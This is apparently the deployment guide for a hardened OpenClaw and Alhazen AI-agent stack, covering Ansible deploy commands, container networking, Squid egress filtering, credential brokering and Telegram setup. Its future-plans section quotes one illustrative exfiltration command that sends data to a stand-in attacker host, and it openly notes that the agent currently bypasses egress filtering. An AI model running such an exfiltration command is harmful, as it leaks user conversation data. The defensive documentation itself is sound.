# Deployment Guide

Deploy OpenClaw + Alhazen as a hardened stack with Telegram access, egress filtering, and credential brokering.

## Development Workflow: A &rarr; B &rarr; C

Skills move through three environments on their way to production:

### (A) Local Development &mdash; Claude Code

Develop and iterate on skills using Claude Code against a local TypeDB instance.

```bash
# Start local TypeDB
make db-start && make db-init

# Develop skills in .claude/skills/<name>/
# Test with local scripts
uv run python .claude/skills/jobhunt/jobhunt.py list-pipeline
```

**What you get:** Fast iteration, full debugger access, direct file editing. Skills live in `.claude/skills/` and schemas in `local_resources/typedb/namespaces/`.

### (B) Local Hardened Testing &mdash; OpenClaw on Mac Mini

Deploy the full hardened stack to a local Mac Mini (or second machine) to test skills in the real OpenClaw environment &mdash; with Squid proxy, LiteLLM credential brokering, and Telegram integration.

```bash
cd deploy
./deploy.sh -t 10.0.110.100 --target-type macmini \
  -p anthropic -m claude-sonnet-4-6 -k "$ANTHROPIC_API_KEY"
```

**What you get:** Real container networking, egress filtering, MCP server integration. Catches issues like proxy bugs, permission errors, and container resource limits before they hit production.

### (C) Production VPS

Deploy to a public VPS for everyday use via Telegram.

```bash
cd deploy
./deploy.sh -t 5.78.187.158 --target-type vps \
  -p anthropic -m claude-sonnet-4-6 -k "$ANTHROPIC_API_KEY"
```

**What you get:** SSH-hardened server, UFW firewall, Fail2Ban, rootless Podman, Tailscale VPN, weekly security audits.

## Quick Start

### Prerequisites

On your **control machine** (laptop):
- `ansible` and `ansible-playbook`
- `openssl` and `ssh-keygen`
- SSH access to the target host

On the **target host**:
- **VPS:** Fresh Debian/Ubuntu (Podman installed automatically)
- **Mac Mini:** Docker Desktop running

### Deploy

```bash
cd deploy

# Interactive mode (prompts for everything)
./deploy.sh

# Non-interactive VPS deployment
./deploy.sh -t 5.78.187.158 -p anthropic -m claude-sonnet-4-6 -k "$KEY" --non-interactive

# Ollama (local LLM, no API key needed)
./deploy.sh -t 10.0.110.100 -p ollama -m "qwen2.5:0.5b" -u "http://10.0.110.1:11434"

# AWS with custom SSH
./deploy.sh -t 54.x.x.x --ssh-user ubuntu --ssh-key ~/aws.pem \
  -p anthropic -m claude-sonnet-4-6 -k "$KEY"
```

### Post-Deploy

The deploy script outputs:
- SSH command with generated key
- Generated 3-word hostname
- Dashboard URLs

To connect via Telegram, you need to configure the bot token in `openclaw.json` on the target (see [Telegram Setup](#telegram-setup) below).

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Container Network                         │
│                                                              │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐            │
│  │ Telegram │────▶│ OpenClaw │────▶│ LiteLLM  │──▶ Anthropic API
│  │          │     │  Agent   │     │  Proxy   │            │
│  └──────────┘     └────┬─────┘     └──────────┘            │
│                        │                                     │
│              ┌─────────┼─────────┐                          │
│              │         │         │                           │
│         ┌────▼───┐ ┌───▼────┐ ┌─▼────────┐                │
│         │ TypeDB │ │  MCP   │ │Dashboard │                 │
│         │        │ │ Server │ │          │                  │
│         └────────┘ └───┬────┘ └──────────┘                 │
│                        │                                     │
│                   ┌────▼────┐                                │
│                   │  Squid  │──▶ Allowlisted domains only   │
│                   │  Proxy  │                                │
│                   └─────────┘                                │
└─────────────────────────────────────────────────────────────┘
```

### Network Design

Two Docker/Podman networks isolate traffic:

| Network | Access | Services |
|---------|--------|----------|
| `openclaw-internal` | No internet (bridge, internal) | All services |
| `openclaw-external` | Internet access | LiteLLM, Squid, OpenClaw agent |

**Key design decision:** The OpenClaw agent connects directly to the external network (for Telegram) but does **not** use Squid proxy. This is because the `@anthropic-ai/sdk` in Node.js honors `HTTP_PROXY` but ignores `NO_PROXY`, which would route internal LiteLLM calls (`http://litellm:4000`) through Squid where the container hostname can't resolve. The agent talks to LiteLLM directly via the internal network instead.

The MCP server **does** use Squid proxy for its outbound requests (e.g., Europe PMC API calls), because Python's `requests` library properly respects `NO_PROXY`.

### Services

| Service | Port | Purpose |
|---------|------|---------|
| **openclaw** | 18789 | AI agent (Telegram, gateway) |
| **litellm** | 4000 | LLM credential broker & model routing |
| **squid** | 3128 | Egress-filtered HTTP proxy |
| **typedb** | 1729 | Knowledge graph database |
| **alhazen-mcp** | 3000 | MCP server (TypeDB + web tools) |
| **alhazen-dashboard** | 3001 | Next.js dashboard UI |

### Security Layers

| Layer | Implementation |
|-------|---------------|
| SSH key-only auth | Password auth disabled on deploy |
| Firewall | UFW (Linux) / pf (macOS) &mdash; only SSH + Tailscale |
| Fail2Ban | SSH brute-force protection (Linux) |
| Egress filtering | Squid allowlist (only approved domains) |
| Credential isolation | LiteLLM holds real API keys; agent gets internal-only token |
| Read-only containers | LiteLLM, MCP, Dashboard &mdash; tmpfs for /tmp |
| Resource limits | Per-container CPU and memory caps |
| Rootless Podman | No root privileges (Linux VPS) |
| Weekly security audits | Automated monitoring via systemd/launchd |

## Configuration Files

All templates are in `roles/alhazen-setup/templates/`:

| Template | Deployed As | Purpose |
|----------|------------|---------|
| `docker-compose.yml.j2` | `docker-compose.yml` | Container orchestration |
| `Dockerfile.j2` | `Dockerfile` | OpenClaw image (Node 22 + uv) |
| `litellm-config.yaml.j2` | `litellm-config.yaml` | Model routing (Anthropic/OpenAI/Ollama) |
| `litellm.env.j2` | `litellm.env` | Real API keys (LiteLLM only) |
| `env.j2` | `.env` | Compose variable substitution |
| `openclaw.json.j2` | `openclaw.json` | Agent config (models, channels, skills) |
| `mcp.json.j2` | `mcp.json` | MCP server connections |
| `tools.yaml.j2` | `tools.yaml` | Tool execution allowlist |
| `exec-approvals.json.j2` | `exec-approvals.json` | Command execution policy |
| `allowlist.txt.j2` | `allowlist.txt` | Squid domain allowlist |
| `monitor.sh.j2` | `monitor.sh` | Weekly security audit script |

## Supported LLM Providers

| Provider | Model Examples | Notes |
|----------|---------------|-------|
| `anthropic` | `claude-sonnet-4-6`, `claude-opus-4-6`, `claude-haiku-4-5-20251001` | Default provider |
| `openai` | `gpt-4o` | Via LiteLLM translation |
| `ollama` | `qwen2.5:0.5b`, `llama3`, `deepseek-r1:8b` | Local/network Ollama server |
| `openai_compatible` | Any | Custom base URL + API key |

### Switching Models After Deploy

On the target host, edit two files:

```bash
# 1. LiteLLM config (model routing)
vim ~/openclaw-docker/litellm-config.yaml

# 2. OpenClaw config (agent model selection)
vim ~/openclaw-docker/openclaw-data/openclaw.json
# Change: models.providers.anthropic.models[0].id
# Change: agents.defaults.model.primary

# 3. Restart
podman restart openclaw-litellm openclaw-agent   # VPS
docker restart openclaw-litellm openclaw-agent    # Mac Mini
```

## Telegram Setup

1. Create a bot via [@BotFather](https://t.me/BotFather)
2. Get the bot token
3. After deployment, SSH to the target and edit `openclaw.json`:

```bash
vim ~/openclaw-docker/openclaw-data/openclaw.json
```

Add/update the telegram section under `channels`:
```json
"telegram": {
  "enabled": true,
  "dmPolicy": "pairing",
  "botToken": "YOUR_BOT_TOKEN",
  "groupPolicy": "allowlist",
  "streamMode": "partial"
}
```

4. Restart the agent:
```bash
podman restart openclaw-agent   # VPS
docker restart openclaw-agent   # Mac Mini
```

5. Message your bot on Telegram &mdash; it will ask you to pair.

## Updating the Squid Allowlist

To add domains without a full redeploy:

```bash
# Edit the template
vim roles/alhazen-setup/templates/allowlist.txt.j2

# Push to target
./update-allowlist.sh -t 5.78.187.158
```

## Channel User Management

Manage messaging channel allowlists (Telegram, WhatsApp, Discord, Signal) without a full redeploy:

```bash
# Add a Telegram user
./update-channels.sh -t 5.78.187.158 --channel telegram --add-user 7365829064

# Remove a user
./update-channels.sh -t 5.78.187.158 --channel telegram --remove-user 7365829064

# List current users for a channel
./update-channels.sh -t 5.78.187.158 --channel telegram --list

# Mac Mini target
./update-channels.sh -t 10.0.110.100 --target-type macmini --channel telegram --add-user 7365829064

# Custom compose project (dual-stack)
./update-channels.sh -t 5.78.187.158 --compose-project openclaw-dev --channel telegram --add-user 7365829064
```

The script patches `openclaw.json` on the target, adding/removing user IDs from the channel's `allowFrom` array. The agent container is automatically restarted when changes are made. Idempotent — adding an existing user is a no-op.

## Updating Skills

Skills are copied from the repo's `.claude/skills/` directory during deploy. To update:

```bash
# Option 1: Full redeploy (re-clones repo, re-copies skills)
./deploy.sh -t 5.78.187.158 -p anthropic -m claude-sonnet-4-6 -k "$KEY"

# Option 2: Manual update on target
ssh openclaw@5.78.187.158
cp -r ~/skillful-alhazen/.claude/skills/* ~/openclaw-docker/workspace/skills/
podman restart openclaw-agent
```

## Resource Requirements

| Target | Min RAM | Min Disk | Notes |
|--------|---------|----------|-------|
| VPS | 4 GB | 20 GB | TypeDB needs ~2GB; LiteLLM needs ~1GB |
| Mac Mini | 8 GB | 20 GB | Docker Desktop overhead |

### Container Memory Limits

| Container | Limit | Notes |
|-----------|-------|-------|
| LiteLLM | 1 GB | Was 512MB, caused OOM on startup |
| TypeDB | 2 GB | JVM heap |
| MCP Server | 1 GB | Python + TypeDB driver |
| Dashboard | 512 MB | Next.js |

## Troubleshooting

### LiteLLM OOM / Crash Loop

**Symptom:** LiteLLM container keeps restarting. `dmesg | grep oom` shows kills.

**Fix:** Increase `mem_limit` in `docker-compose.yml`. LiteLLM needs ~700MB at idle with the Anthropic provider. The template sets 1GB.

### Agent Can't Reach LiteLLM

**Symptom:** LLM calls hang silently, never complete.

**Cause:** If `HTTP_PROXY` is set on the agent container, the `@anthropic-ai/sdk` routes *all* HTTP through the proxy &mdash; including internal `http://litellm:4000` calls. Squid can't resolve container hostnames, so the request hangs.

**Fix:** The agent must NOT have `HTTP_PROXY`/`HTTPS_PROXY` env vars. It gets direct internet via `openclaw-external` network and talks to LiteLLM via `openclaw-internal`.

### Model Not Found (HTTP 404)

**Symptom:** `{"type":"error","error":{"type":"not_found_error","message":"model: xxx"}}`

**Fix:** Verify the model ID in `litellm-config.yaml` matches a real Anthropic model ID. Current valid IDs:
- `claude-sonnet-4-6`
- `claude-opus-4-6`
- `claude-haiku-4-5-20251001`

### TypeDB Not Ready

**Symptom:** MCP server can't connect to TypeDB.

**Fix:** TypeDB takes 30-60 seconds to start. The `typedb-init` container waits for the healthcheck. If it fails, check logs: `podman logs alhazen-typedb`.

## Cleaning Up Old Installations

If you previously had a standalone Alhazen stack (separate user):

```bash
./cleanup-old-alhazen.sh -t 5.78.187.158
```

This removes the old `alhazen` user, containers, and images, freeing ports 1729/3000/3001.

## Possible Future Plans

### Restore Egress Filtering for the Agent

**Problem:** The agent currently bypasses Squid because the `@anthropic-ai/sdk` honors `HTTP_PROXY` but ignores `NO_PROXY`. This means internal `http://litellm:4000` calls get routed through Squid, where the container hostname can't resolve. The workaround is giving the agent direct internet access, which loses domain-level egress filtering.

**What was lost:** Without Squid filtering, the agent can reach any domain. A prompt injection attack could exfiltrate conversation context to an arbitrary URL (e.g., `curl https://attacker.com/exfil?data=...`). The MCP server still uses Squid, so only the agent is affected.

**Recommended fix: Transparent proxy with iptables in the container namespace**

Instead of setting `HTTP_PROXY` (which the SDK mishandles), switch Squid to transparent intercept mode and use iptables rules inside the agent's network namespace to silently redirect outbound port 443 traffic to Squid:

1. Configure Squid with `http_port 3129 intercept` and `ssl_bump peek+splice` (reads TLS SNI without decryption)
2. Use [OCI hooks](https://jerabaul29.github.io/jekyll/update/2025/10/17/Firewall-a-podman-container.html) at the `createContainer` stage to inject iptables rules into the agent's netns:
   ```bash
   # Allow internal network (LiteLLM, TypeDB) - pass through directly
   iptables -t nat -A OUTPUT -d 172.28.0.0/16 -j RETURN
   # Redirect all other port 80/443 to Squid transparent port
   iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 3129
   iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 3128
   ```
3. No `HTTP_PROXY` env var needed &mdash; the agent makes direct connections, iptables handles the redirect, Squid applies the domain allowlist via SNI inspection

**Why this works:** The `RETURN` rule for `172.28.0.0/16` ensures LiteLLM traffic passes through untouched. All other HTTPS traffic hits Squid's transparent port, where the SNI-based allowlist filters it. The SDK never knows a proxy exists.

**Key considerations:**
- Rootless Podman creates bridges inside `rootless-netns`, not the host namespace. Rules must be injected via OCI hooks or `podman unshare --rootless-netns`
- Rules are lost on container restart; the OCI hook re-applies them automatically
- Squid's `ssl_bump peek step1; ssl_bump splice all` reads SNI without MITM (no CA cert needed)
- Does not work if clients use ECH (Encrypted Client Hello), but API SDKs don't use ECH today

**Alternative approaches considered:**
- **cgroup v2 nftables filtering** &mdash; requires reloading rules on every container restart, operationally fragile
- **UID-based host iptables** &mdash; can't filter by domain, only IP ranges (CDN IPs rotate)
- **DNS-based filtering (CoreDNS RPZ)** &mdash; defense-in-depth but bypassable by hardcoded IPs
- **Upstream SDK fix** &mdash; [claude-code#22752](https://github.com/anthropics/claude-code/issues/22752) tracks the `NO_PROXY` bug; if fixed, the original Squid explicit proxy architecture works as designed

**References:**
- [Podman Discussion #27099](https://github.com/containers/podman/discussions/27099) &mdash; rootless container network filtering
- [OCI hooks for container firewalling](https://jerabaul29.github.io/jekyll/update/2025/10/17/Firewall-a-podman-container.html)
- [Squid SslPeekAndSplice](https://wiki.squid-cache.org/Features/SslPeekAndSplice) &mdash; SNI-based filtering without MITM

### File an Upstream Bug

The `NO_PROXY` issue affects anyone using the openclaw-hardened-ansible stack with Squid. File issues on:
- `@anthropic-ai/sdk` (Node.js) &mdash; should respect `NO_PROXY` / `no_proxy` for internal service calls
- `openclaw-hardened-ansible` &mdash; document the proxy bug and workaround in their docker-compose

## Relationship to Upstream

This deployment stack is adapted from [openclaw-hardened-ansible](https://github.com/Next-Kick/openclaw-hardened-ansible). Key additions:

- TypeDB knowledge graph + schema initialization
- Alhazen MCP server (TypeDB + web tools)
- Alhazen dashboard (Next.js)
- Skill deployment pipeline
- Proxy bug workaround (agent bypasses Squid)
